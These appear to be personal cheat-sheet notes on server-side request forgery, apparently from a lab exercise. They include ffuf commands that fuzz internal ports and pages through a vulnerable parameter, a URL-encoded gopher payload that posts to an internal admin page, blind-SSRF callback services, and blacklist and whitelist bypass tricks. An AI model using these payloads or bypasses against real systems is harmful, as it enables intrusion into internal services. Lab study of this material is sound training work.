https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
##### Fuzz to check open ports:
```bash
ffuf -w ports.txt -u http://10.129.82.103/index.php -X POST -d "dateserver=http://localhost:FUZZ&date=2024-01-01"  -H "Content-Type: application/x-www-form-urlencoded"  -fr 'Failed'
```

##### Fuzz to find available page
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

##### Gopher
Send arbitrary bytes to a TCP socket.
Request:
```
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```
URL encode it:
```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
URL generator:
https://github.com/tarunkant/Gopherus

### Blind SSRF

Burp collaborator replacements:
https://app.requestbin.net/
[Interactsh | Web Client](https://app.interactsh.com/#/)
[Webhook.site - Test, transform and automate Web requests and emails](https://webhook.site/#!/view/295f010b-22b7-4a69-a790-2ed9ff4b8a0e)

#### Prevention
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

#### Blacklist bypass
- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.
* Double URL encode
##### Whitelist bypass
* `https://expected-host:fakepassword@evil-host`
* `https://evil-host#expected-host`
* `https://expected-host.evil-host`
* Open redirects

##### Attack surfaces
* Partial URLs in requests
* XML - SSRF via XXE
* Referer
